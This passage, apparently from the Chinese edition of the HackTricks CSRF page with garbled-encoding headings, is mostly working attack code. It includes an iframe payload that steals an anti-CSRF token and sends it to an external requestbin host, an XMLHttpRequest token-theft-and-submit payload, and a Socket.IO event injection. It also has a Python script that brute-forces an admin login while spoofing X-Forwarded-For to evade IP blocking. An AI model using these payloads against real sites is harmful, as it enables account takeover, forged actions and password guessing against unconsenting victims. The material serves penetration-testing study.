document.forms[0].submit.click();
}
</script>
```
### **çªƒå–ä»¤ç‰Œå¹¶ä½¿ç”¨ 2 ä¸ª iframe å‘é€**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTé€šè¿‡Ajaxçªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨è¡¨å•å‘é€POST**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRFä¸Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF ç™»å½•æš´åŠ›ç ´è§£

è¯¥ä»£ç å¯ç”¨äºé€šè¿‡ CSRF ä»¤ç‰Œå¯¹ç™»å½•è¡¨å•è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆå®ƒè¿˜ä½¿ç”¨äº† X-Forwarded-For å¤´æ¥å°è¯•ç»•è¿‡å¯èƒ½çš„ IP é»‘åå•ï¼‰ï¼š
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Tools <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## References

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œï¼

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
